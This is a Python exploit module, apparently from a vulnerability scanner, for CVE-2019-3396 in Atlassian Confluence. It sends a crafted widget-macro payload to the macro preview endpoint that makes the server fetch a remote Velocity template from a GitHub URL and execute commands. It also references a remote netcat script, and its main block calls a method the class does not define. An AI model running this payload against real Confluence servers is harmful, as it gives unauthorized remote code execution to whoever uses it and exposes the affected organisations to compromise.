#!/usr/bin/env python3

import re
from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class CVE_2019_3396_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-3396',
            'description': 'Atlassian Confluence Unauthorized Template Injection/Code Execution Vulnerability, Atlassian Confluence 6.6.12之前所有6.6.x版本,6.12.3之前所有6.12.x版本,6.13.13之前所有6.13.x版本,6.14.2之前所有6.14.x版本',
            'date': '2019-02-28',
            'exptype': 'check',
            'type': 'Injection'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta()
        self.headers = {
            "User-Agent": get_useragent(),
            "Referer": self.url + "/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
            "Content-Type": "application/json; charset=utf-8"
        }
        self.vm_url = 'https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm'
        self.py_url = 'https://raw.githubusercontent.com/HoldOnToYourHeart/nc/master/nc.py'
        self.payload = '{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"vm_url","cmd":"exec_cmd"},"body":""}}'
    
    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_req = await request.post(self.url + "/rest/tinymce/1/macro/preview", data = self.payload.replace('vm_url', self.vm_url).replace('exec_cmd', 'echo %swin^dowslin$1ux' % (self.capta)), headers = self.headers)
            if check_req.status == 200 and "wiki-content" in await check_req.text():
                result = re.findall('.*wiki-content">\n(.*)\n            </div>\n', await check_req.text(), re.S)
                if self.capta in result[0] and ('windows' in result[0] or 'linux' in result[0]):
                    return True
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    CVE_2019_3396 = CVE_2019_3396_BaseVerify('http://127.0.0.1:8090')
    CVE_2019_3396.cmd('id')